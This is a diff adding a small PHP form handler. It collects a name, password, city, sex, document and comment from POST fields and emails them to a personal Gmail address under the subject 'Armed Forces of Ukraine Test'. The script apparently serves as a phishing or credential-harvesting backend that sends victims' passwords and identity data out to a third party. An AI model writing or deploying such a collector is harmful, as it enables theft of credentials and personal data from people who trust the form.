@@ -1,0 +1,11 @@
+<?php //error_reporting(0);
+    $name = $_POST["name"];
+    $pasword = $_POST["pasword"];
+    $city = $_POST["city"];
+    $woman = $_POST["man"];
+    $document = $_POST["document"];
+    $coment = $_POST["koment"];
+    $pidpus = "Збройні Сили України Test";
+    $forma1 ="<br>".$name."<br>".$pasword."<br>".$city."<br>".$woman."<br>".$document."<br>".$coment;
+mail("darkopasha@gmail.com", "$pidpus", $forma1, "Content-type: text/html; charset=utf-8 \r\n");
+echo("Відправлено");
